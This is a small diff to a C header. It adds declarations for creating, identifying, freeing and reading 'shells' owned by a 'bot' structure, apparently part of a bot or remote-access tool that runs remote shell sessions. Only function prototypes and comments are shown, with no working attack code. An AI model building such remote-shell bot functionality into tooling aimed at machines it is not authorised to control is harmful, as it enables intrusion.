@@ -8,8 +8,15 @@
 struct sLaika_bot;
 struct sLaika_shell;
 
-struct sLaika_shell *laikaB_newShell(struct sLaika_bot *bot, int cols, int rows);
+struct sLaika_shell *laikaB_newShell(struct sLaika_bot *bot, int cols, int rows, uint32_t id);
 void laikaB_freeShell(struct sLaika_bot *bot, struct sLaika_shell *shell);
+
+/* raw platform-dependent shell allocation */
+struct sLaika_shell *laikaB_newRAWShell(struct sLaika_bot *bot, int cols, int rows, uint32_t id);
+void laikaB_freeRAWShell(struct sLaika_bot *bot, struct sLaika_shell *shell);
+
+/* has to be a function since the struct is different depending on the platform */
+uint32_t laikaB_getShellID(struct sLaika_bot *bot, struct sLaika_shell *shell);
 
 /* handles reading & writing to shell pipes */
 bool laikaB_readShell(struct sLaika_bot *bot, struct sLaika_shell *shell);
